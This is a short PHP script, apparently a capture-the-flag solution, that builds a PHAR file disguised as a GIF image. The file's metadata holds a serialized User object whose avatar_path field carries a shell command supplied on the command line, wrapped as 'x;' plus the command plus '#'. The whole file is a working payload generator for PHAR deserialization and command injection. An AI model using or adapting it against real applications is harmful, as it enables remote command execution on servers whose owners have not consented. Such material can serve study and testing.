<?php
class User { public $avatar_path; public $name; public $password; }

$command = $argv[1];
$out = "/tmp/pharry_www/payload.phar";
@unlink($out);

$p = new Phar($out);
$p->startBuffering();
$p->addFromString("x.txt", "x");
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");

$u = new User();
$u->name = "x";
$u->password = "x";
$u->avatar_path = "x;" . $command . "#";
$p->setMetadata($u);
$p->stopBuffering();
